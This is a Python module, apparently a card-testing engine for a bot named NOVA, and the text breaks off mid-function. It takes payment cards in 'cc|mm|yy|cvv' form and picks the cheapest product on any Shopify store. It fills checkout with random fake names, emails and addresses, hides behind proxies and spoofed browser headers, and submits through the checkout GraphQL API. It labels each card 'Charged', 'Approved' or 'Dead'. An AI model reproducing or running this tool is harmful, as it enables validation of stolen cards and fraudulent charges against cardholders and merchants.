"""
shopify_api_engine.py — Shopify GraphQL checkout engine (standalone).

Public API:
    run_shopify_check(site, card, proxy_str=None, variant_id=None) -> dict
    is_proxy_alive(proxy_url, timeout=6.0) -> bool
    get_cached_variant(domain) -> tuple
    ledger_clear()
    ledger_stats() -> dict

Returns a dict shaped for NOVA's bot.py:
    {
        "status":      "Charged" | "Approved" | "Dead" | "Error",
        "message":     str,
        "card":        "cc|mm|yy|cvv",
        "gateway":     "Shopify ...",
        "price":       "$12.34" | "-",
        "price_value": float,
        "site":        "https://...",
        "status_code": str,
        "retryable":   bool,
        "elapsed":     float,
    }
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
import random
import re
import threading
import time
import traceback
from decimal import Decimal
from urllib.parse import urlparse, parse_qs

import aiohttp

try:
    from aiohttp_socks import ProxyConnector, ProxyType
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

log = logging.getLogger("shopify_api_engine")

VARIANT_CACHE_FILE = "variant_cache.json"
_CACHE_TTL = 3600
_cache = {}
_cache_lock = threading.Lock()
_cache_loaded = False

REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "90"))


# ══════════════════════════════════════════════════════════════════════
#  VARIANT CACHE
# ══════════════════════════════════════════════════════════════════════
def _load_variant_cache():
    global _cache, _cache_loaded
    if _cache_loaded:
        return
    try:
        if os.path.exists(VARIANT_CACHE_FILE):
            with open(VARIANT_CACHE_FILE, "r") as f:
                _cache = json.load(f)
    except Exception as e:
        log.warning(f"cache load failed: {e}")
        _cache = {}
    _cache_loaded = True


def _save_variant_cache():
    try:
        with _cache_lock:
            with open(VARIANT_CACHE_FILE, "w") as f:
                json.dump(_cache, f, indent=2)
    except Exception as e:
        log.warning(f"cache save failed: {e}")


def get_cached_variant(domain):
    _load_variant_cache()
    domain = domain.rstrip("/")
    with _cache_lock:
        e = _cache.get(domain)
        if e and time.time() - e.get("timestamp", 0) < _CACHE_TTL:
            return (e.get("variant_id"), e.get("price"),
                    e.get("requires_shipping"), e.get("handle"),
                    e.get("currency", "USD"))
    return None, None, None, None, None


def _set_cached_variant(domain, vid, price, ship, handle=None, currency="USD"):
    _load_variant_cache()
    domain = domain.rstrip("/")
    with _cache_lock:
        _cache[domain] = {
            "variant_id": vid,
            "price": price,
            "requires_shipping": ship,
            "handle": handle or "cached",
            "currency": currency or "USD",
            "timestamp": time.time(),
        }
    _save_variant_cache()


# ══════════════════════════════════════════════════════════════════════
#  PROXY
# ══════════════════════════════════════════════════════════════════════
_SCHEME_RE = re.compile(r"^([a-zA-Z][a-zA-Z0-9+.\-]*)://(.*)$")


def _is_port(v):
    return v.isdigit() and 1 <= int(v) <= 65535


def parse_proxy(raw):
    if not raw:
        return None
    raw = raw.strip()
    if not raw:
        return None
    scheme, body = "http", raw
    m = _SCHEME_RE.match(raw)
    if m:
        scheme, body = m.group(1).lower(), m.group(2)
    user = password = None
    if "@" in body:
        auth, body = body.rsplit("@", 1)
        if ":" in auth:
            user, password = auth.split(":", 1)
        else:
            user = auth
    parts = body.split(":")
    if len(parts) == 2:
        host, port = parts
    elif len(parts) == 4:
        p0, p1, p2, p3 = parts
        if _is_port(p1):
            host, port, user, password = p0, p1, p2, p3
        elif _is_port(p3):
            user, password, host, port = p0, p1, p2, p3
        else:
            host, port, user, password = p0, p1, p2, p3
    elif len(parts) == 3:
        host, port, user = parts
        password = ""
    else:
        return None
    if not host or not _is_port(port):
        return None
    return {"url": f"{scheme}://{user}:{password or ''}@{host}:{port}" if user
                    else f"{scheme}://{host}:{port}",
            "scheme": scheme, "host": host, "port": int(port),
            "user": user, "pass": password}


def _is_socks(p):
    return bool(p) and p["scheme"] in ("socks4", "socks5", "socks5h")


def _proxy_for_aiohttp(p):
    if not p or _is_socks(p):
        return None
    return p["url"]


def _make_connector(p, **kw):
    if p and _is_socks(p) and HAS_SOCKS:
        ptype = {"socks4": ProxyType.SOCKS4,
                 "socks5": ProxyType.SOCKS5,
                 "socks5h": ProxyType.SOCKS5}[p["scheme"]]
        return ProxyConnector(proxy_type=ptype, host=p["host"], port=p["port"],
                              username=p["user"], password=p["pass"] or "", **kw)
    return aiohttp.TCPConnector(ssl=False, force_close=False,
                                enable_cleanup_closed=True, **kw)


# ══════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════
def _extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            tail = text.split(start, 1)[1]
            if end in tail:
                return tail.split(end, 1)[0]
    except Exception:
        pass
    return None


def _find_first(text, *patterns):
    if not text:
        return None
    for start, end in patterns:
        if start and end and start in text:
            tail = text.split(start, 1)[1]
            if end in tail:
                r = tail.split(end, 1)[0]
                if r:
                    return r
    return None


def _is_captcha_required(text):
    if not text:
        return False
    low = text.lower()
    return any(i in low for i in ("captcha_required", "hcaptcha",
                                   "cf-browser-verification", "just a moment"))


def _is_dead_store(html):
    if not html:
        return False
    low = html.lower()
    return any(i in low for i in (
        "this store is currently unavailable",
        "store is currently unavailable",
        "reactivate your store",
        "store is unavailable",
    ))


def _extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    m = str(message)
    for pat in (r"(PAYMENTS?_[A-Z_]+)", r"(CARD_[A-Z_]+)",
                r"([A-Z]+_[A-Z]+_[A-Z_]+)", r"([A-Z]+_[A-Z]+)",
                r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?'):
        g = re.search(pat, m, re.IGNORECASE)
        if g and "_" in g.group(1):
            return g.group(1).strip("{}:'\" ")
    return m[:200]


def _get_op(query_str):
    m = re.search(r"(?:query|mutation)\s+(\w+)", query_str)
    return m.group(1) if m else None


# ══════════════════════════════════════════════════════════════════════
#  ADDRESS
# ══════════════════════════════════════════════════════════════════════
_C2C = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "EUR": "DE", "AUD": "AU",
    "INR": "IN", "AED": "AE", "HKD": "HK", "CHF": "CH", "JPY": "JP",
    "CNY": "CN", "SGD": "SG", "KRW": "KR", "MXN": "MX", "BRL": "BR",
    "NZD": "NZ", "SEK": "SE", "NOK": "NO", "DKK": "DK", "PLN": "PL",
    "TRY": "TR", "ZAR": "ZA", "ILS": "IL", "RUB": "RU", "THB": "TH",
    "MYR": "MY", "IDR": "ID", "PHP": "PH", "VND": "VN", "TWD": "TW",
}

_BOOK = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080",
           "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3",
           "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE",
           "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "DE": {"address1": "Unter den Linden 1", "city": "Berlin", "postalCode": "10117",
           "zoneCode": "BE", "countryCode": "DE", "phone": "302400000"},
    "FR": {"address1": "10 Rue de Rivoli", "city": "Paris", "postalCode": "75001",
           "zoneCode": "IDF", "countryCode": "FR", "phone": "140000000"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000",
           "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001",
           "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000",
           "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "00000",
           "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430",
           "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "JP": {"address1": "1-1 Chiyoda", "city": "Tokyo", "postalCode": "100-0001",
           "zoneCode": "TK", "countryCode": "JP", "phone": "312345678"},
    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616",
           "zoneCode": "SG", "countryCode": "SG", "phone": "65331234"},
    "NZ": {"address1": "1 Queen Street", "city": "Auckland", "postalCode": "1010",
           "zoneCode": "AUK", "countryCode": "NZ", "phone": "93000000"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080",
                "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


def _pick_addr(url=None, currency=None):
    currency = (currency or "").upper()
    if currency in _C2C:
        c = _C2C[currency]
        if c in _BOOK:
            return _BOOK[c]
    if url:
        tld = urlparse(url).netloc.split(".")[-1].upper()
        if tld in _BOOK:
            return _BOOK[tld]
    return _BOOK["DEFAULT"]


_FIRST_NAMES = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda"]
_LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez"]
_EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]


def _random_name():
    return random.choice(_FIRST_NAMES), random.choice(_LAST_NAMES)


def _gen_email(first, last):
    return f"{first.lower()}.{last.lower()}@{random.choice(_EMAIL_DOMAINS)}"


# ══════════════════════════════════════════════════════════════════════
#  GRAPHQL QUERIES
# ══════════════════════════════════════════════════════════════════════
Q_PROPOSAL = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}fragment ProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{deliveryLines{selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle title amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name orderingIndex extensibilityDisplayName __typename}__typename}__typename}__typename}__typename}merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}isShippingRequired __typename}"""

Q_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryReservationFailure{__typename}__typename}__typename}__typename}"""

Q_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url __typename}orderIdentity{id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryReservationFailure{__typename}...on InventoryClaimFailure{__typename}__typename}__typename}__typename}"""


# ══════════════════════════════════════════════════════════════════════
#  PRODUCT FETCH
# ══════════════════════════════════════════════════════════════════════
async def _fetch_products(session, domain, proxy_url, force=False):
    domain = domain.rstrip("/")
    if not domain.startswith("http"):
        domain = "https://" + domain

    if not force:
        vid, price, ship, handle, cur = get_cached_variant(domain)
        if vid is not None:
            return {
                "site": domain, "price": price, "variant_id": vid,
                "link": f"{domain}/products/{handle or 'cached'}",
                "requires_shipping": ship, "handle": handle or "cached",
                "currency": cur or "USD",
            }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": domain + "/",
    }

    gql = """
    query Products($first:Int!, $after:String) {
        products(first: $first, after: $after, sortKey: PRICE, reverse: false) {
            pageInfo { hasNextPage endCursor }
            edges { node {
                id title handle
                variants(first: 100) { edges { node {
                    id price { amount currencyCode }
                    availableForSale requiresShipping
                } } }
            } }
        }
    }
    """
    all_variants = []
    cursor = None
    for _ in range(6):
        payload = {"query": gql, "variables": {"first": 100, "after": cursor}}
        try:
            async with session.post(
                f"{domain}/api/2024-01/graphql.json",
                json=payload,
                headers={"Content-Type": "application/json", **headers},
                proxy=proxy_url, timeout=10,
            ) as r:
                if r.status != 200:
                    break
                data = await r.json()
                if "errors" in data:
                    break
                products = data.get("data", {}).get("products", {})
                edges = products.get("edges", [])
                if not edges:
                    break
                for edge in edges:
                    node = edge.get("node", {})
                    for ve in node.get("variants", {}).get("edges", []):
                        vn = ve.get("node", {})
                        if not vn.get("availableForSale", False):
                            continue
                        try:
                            blk = vn.get("price") or {}
                            price = float(blk.get("amount", "0"))
                            cur = blk.get("currencyCode", "USD")
                        except (ValueError, TypeError):
                            continue
                        if price <= 0:
                            continue
                        vid = str(vn.get("id", "").split("/")[-1])
                        if not vid:
                            continue
                        all_variants.append({
                            "id": vid, "price": price, "currency": cur,
                            "handle": node.get("handle", "product"),
                            "requires_shipping": vn.get("requiresShipping", True),
                        })
                pi = products.get("pageInfo", {})
                if not pi.get("hasNextPage"):
                    break
                cursor = pi.get("endCursor")
        except Exception:
            break

    if all_variants:
        all_variants.sort(key=lambda x: (x["price"], not x["requires_shipping"]))
        s = all_variants[0]
        _set_cached_variant(domain, s["id"], str(s["price"]),
                             s["requires_shipping"], s["handle"], s["currency"])
        return {
            "site": domain, "price": f"{s['price']:.2f}",
            "variant_id": s["id"], "link": f"{domain}/products/{s['handle']}",
            "requires_shipping": s["requires_shipping"],
            "handle": s["handle"], "currency": s["currency"],
        }

    try:
        all_rest = []
        for page in range(1, 5):
            url = f"{domain}/products.json?limit=250&page={page}"
            async with session.get(url, headers=headers, proxy=proxy_url, timeout=8) as r:
                if r.status != 200:
                    break
                data = await r.json()
                products = data.get("products", [])
                if not products:
                    break
                for p in products:
                    for v in p.get("variants", []):
                        if not v.get("available", True):
                            continue
                        try:
                            price = float(str(v.get("price", "0")).replace(",", ""))
                        except (ValueError, TypeError):
                            continue
                        if price <= 0:
                            continue
                        all_rest.append({
                            "id": str(v.get("id", "")), "price": price,
                            "currency": "USD",
                            "handle": p.get("handle", "product"),
                            "requires_shipping": v.get("requires_shipping", True),
                        })
                if len(products) < 250:
                    break
        if all_rest:
            all_rest.sort(key=lambda x: (x["price"], not x["requires_shipping"]))
            s = all_rest[0]
            _set_cached_variant(domain, s["id"], str(s["price"]),
                                 s["requires_shipping"], s["handle"], s["currency"])
            return {
                "site": domain, "price": f"{s['price']:.2f}",
                "variant_id": s["id"], "link": f"{domain}/products/{s['handle']}",
                "requires_shipping": s["requires_shipping"],
                "handle": s["handle"], "currency": s["currency"],
            }
    except Exception:
        pass

    return None


# ══════════════════════════════════════════════════════════════════════
#  CART
# ══════════════════════════════════════════════════════════════════════
async def _add_to_cart(session, domain, variant_id, proxy_url):
    domain = domain.rstrip("/")
    if not domain.startswith("http"):
        domain = "https://" + domain
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": domain, "Referer": domain + "/products",
    }
    for content_type, body, is_json in (
        ("application/x-www-form-urlencoded; charset=UTF-8", f"id={variant_id}&quantity=1", False),
        ("application/json", json.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}), True),
    ):
        try:
            async with session.post(
                f"{domain}/cart/add.js",
                data=None if is_json else body,
                json=json.loads(body) if is_json else None,
                headers={**headers, "Content-Type": content_type},
                proxy=proxy_url, timeout=10,
            ) as r:
                if r.status in (200, 201):
                    return r
        except Exception:
            continue
    return None


# ══════════════════════════════════════════════════════════════════════
#  MAIN CARD PROCESSOR
# ══════════════════════════════════════════════════════════════════════
async def _process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    proxy_ok = True
    gateway = "Shopify"
    currency = "USD"
    attempted_price = "0.00"
    final_total = "0.00"
    requires_shipping = True
    payment_identifier = None
    proxy = parse_proxy(proxy_str) if proxy_str else None
    proxy_url = _proxy_for_aiohttp(proxy)

    ourl = site_url if site_url.startswith("http") else f"https://{site_url}"

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/json",
            "Origin": ourl, "Referer": ourl,
        }

        address_info = _pick_addr(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName = _random_name()
        email = _gen_email(firstName, lastName)

        try:
            async with aiohttp.ClientSession() as tmp:
                async with tmp.post(
                    f"{ourl}/api/2024-01/graphql.json",
                    json={"query": "{ shop { primaryDomain { url } } }"},
                    headers={"Content-Type": "application/json"}, timeout=5,
                ) as r:
                    if r.status == 200:
                        pd = (await r.json()).get("data", {}) \
                            .get("shop", {}).get("primaryDomain", {}).get("url")
                        if pd:
                            ourl = pd.rstrip("/")
        except Exception:
            pass

        connector = _make_connector(proxy)
        timeout = aiohttp.ClientTimeout(total=18)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            if not variant_id:
                info = await _fetch_products(session, ourl, proxy_url)
                if info is None and not ourl.startswith("https://www."):
                    www = ourl.replace("https://", "https://www.")
                    info = await _fetch_products(session, www, proxy_url, force=True)
                    if info:
                        ourl = www
                if info is None:
                    info = await _fetch_products(session, ourl, proxy_url, force=True)
                if info is None:
                    return False, "Product fetch failed", gateway, "0.00", currency, proxy_ok
                variant_id = info["variant_id"]
                requires_shipping = info.get("requires_shipping", True)
                currency = info.get("currency", "USD")

            cart_resp = await _add_to_cart(session, ourl, variant_id, proxy_url)
            if not cart_resp:
                return False, "Cart failed", gateway, "0.00", currency, proxy_ok

            checkout_headers = {**headers, "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
            sst = None
            text = ""
            checkout_url = ourl + "/checkout"
            try:
                async with session.post(
                    url=ourl + "/checkout", allow_redirects=False,
                    headers=checkout_headers, proxy=proxy_url, timeout=10,
                ) as response:
                    sst = response.headers.get("X-Checkout-One-Session-Token")
                    final_url = ourl + "/checkout"
                    hops = 0
                    while response.status in (301, 302, 303, 307, 308) and hops < 8:
                        loc = response.headers.get("Location")
                        if not loc:
                            break
                        if loc.startswith("/"):
                            loc = f"https://{urlparse(ourl).netloc}{loc}"
                        final_url = loc
                        response = await session.post(
                            url=loc, allow_redirects=False,
                            headers=checkout_headers, proxy=proxy_url, timeout=10,
                        )
                        hs = response.headers.get("X-Checkout-One-Session-Token")
                        if hs:
                            sst = hs
                        hops += 1
                    text = await response.text()
                    if response.status not in (301, 302, 303, 307, 308):
                        checkout_url = str(response.url)
                    else:
                        checkout_url = final_url
                    if not text or len(text) < 500 or not sst:
                        async with session.get(
                            final_url, headers=checkout_headers,
                            proxy=proxy_url, timeout=10,
                        ) as gr:
                            gt = await gr.text()
                            gs = gr.headers.get("X-Checkout-One-Session-Token")
                            if gs:
                                sst = gs
                            if gt and len(gt) > len(text or ""):
                                text = gt
                                checkout_url = str(gr.url)
                            elif not text:
                                text = gt
                                checkout_url = str(gr.url)
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                return False, f"Checkout proxy error: {str(e)[:80]}", gateway, "0.00", currency, False

            if _is_dead_store(text):
                return False, "DEAD_STORE", gateway, "0.00", currency, proxy_ok
            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, "0.00", currency, proxy_ok

            attempt_m = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = attempt_m.group(1) if attempt_m else checkout_url.split("/")[-1].split("?")[0]

            if not sst:
                parsed = urlparse(checkout_url)
                r_param = parse_qs(parsed.query).get("_r", [None])[0]
                if r_param and len(r_param) > 20:
                    sst = r_param
            if not sst:
                sst = _find_first(
                    text,
                    ('name="serialized-sessionToken" content="&quot;', "&quot;"),
                    ('name="serialized-sessionToken" content="', '"'),
                    ('"serializedSessionToken":"', '"'),
                    ('data-session-token="', '"'),
                    ('<meta name="serialized-sessionToken" content="', '"'),
                    ('"sessionToken":"', '"'),
                )
            if not sst:
                tok = re.search(r"[a-f0-9]{32,}", checkout_url)
                if tok:
                    sst = tok.group(0)
            if not sst:
                return False, "Failed to get session token", gateway, "0.00", currency, proxy_ok

            queue_token = _find_first(text, ("queueToken&quot;:&quot;", "&quot;"),
                                       ('"queueToken":"', '"')) or ""
            stable_id = _find_first(text, ("stableId&quot;:&quot;", "&quot;"),
                                     ('"stableId":"', '"')) or "1"

            detected_currency = (
                _find_first(text, ("currencyCode&quot;:&quot;", "&quot;"),
                             ('"currencyCode":"', '"'))
                or _find_first(text, ("presentmentCurrency&quot;:&quot;", "&quot;"),
                                ('"presentmentCurrency":"', '"'))
            )
            if detected_currency:
                currency = detected_currency
                address_info = _pick_addr(ourl, currency)

            country_code = address_info["countryCode"]
            phone = address_info["phone"]
            street = address_info["address1"]
            city = address_info["city"]
            state = address_info["zoneCode"]
            s_zip = address_info["postalCode"]

            subtotal = (
                _extract_between(text,
                    'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                    "&quot;")
                or _extract_between(text,
                    '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                m = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = m.group(1) if m else "0.01"
            attempted_price = subtotal

            unescaped = text.replace("&quot;", '"')
            bm = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            build_id = bm.group(1) if bm else None
            im = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            ident_sig = im.group(1) if im else None
            source_token = _extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace("&quot;", "").strip('"')

            use_persisted = ("internal/graphql/persisted" in text
                              or "persisted?operationName" in text)
            graphql_url = (f"https://{urlparse(ourl).netloc}/checkouts/internal/graphql/persisted"
                            if use_persisted else
                            f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql")

            headers.update({
                "shopify-checkout-client": "checkout-web/1.0",
                "shopify-checkout-source": f'id="{attempt_token}", type="cn"',
                "x-checkout-one-session-token": sst,
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            })
            if build_id:
                headers["x-checkout-web-build-id"] = build_id
                headers["x-checkout-web-deploy-stage"] = "production"
                headers["x-checkout-web-server-handling"] = "fast"
                headers["x-checkout-web-server-rendering"] = "yes"
            if source_token:
                headers["x-checkout-web-source-id"] = source_token

            async def gql(payload):
                nonlocal proxy_ok
                try:
                    op = payload.get("operationName")
                    params = {"operationName": op} if op else {}
                    async with session.post(
                        graphql_url, params=params, headers=headers,
                        json=payload, proxy=proxy_url, timeout=10,
                    ) as r:
                        return await r.text()
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    proxy_ok = False
                    raise

            if requires_shipping:
                delivery_input = {
                    "deliveryLines": [{
                        "destination": {"partialStreetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": firstName, "lastName": lastName,
                            "zoneCode": state, "phone": phone,
                        }},
                        "selectedDeliveryStrategy": {
                            "deliveryStrategyMatchingConditions": {
                                "estimatedTimeInTransit": {"any": True},
                                "shipments": {"any": True},
                            },
                            "options": {},
                        },
                        "targetMerchandiseLines": {"any": True},
                        "deliveryMethodTypes": ["SHIPPING"],
                        "expectedTotalPrice": {"any": True},
                        "destinationChanged": True,
                    }],
                    "noDeliveryRequired": [],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }
            else:
                delivery_input = {
                    "deliveryLines": [],
                    "noDeliveryRequired": [{"stableId": stable_id}],
                    "useProgressiveRates": False,
                    "prefetchShippingRatesStrategy": None,
                    "supportsSplitShipping": True,
                }

            proposal_op = _get_op(Q_PROPOSAL) or "Proposal"
            proposal_payload = {
                "query": Q_PROPOSAL,
                "variables": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": delivery_input,
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {"merchandiseLines": [{
                        "stableId": stable_id,
                        "merchandise": {"productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                            "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                            "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                        }},
                        "quantity": {"items": {"value": 1}},
                        "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                        "lineComponentsSource": None, "lineComponents": [],
                    }]},
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {"streetAddress": {
                            "address1": "", "city": "", "countryCode": country_code,
                            "lastName": "", "zoneCode": "ENG", "phone": "",
                        }},
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email, "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {"proposedAllocations": None, "proposedTotalAmount": {"any": True},
                              "proposedTotalIncludedAmount": None,
                              "proposedMixedStateTotalAmount": None, "proposedExemptions": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": proposal_op,
            }
            if use_persisted:
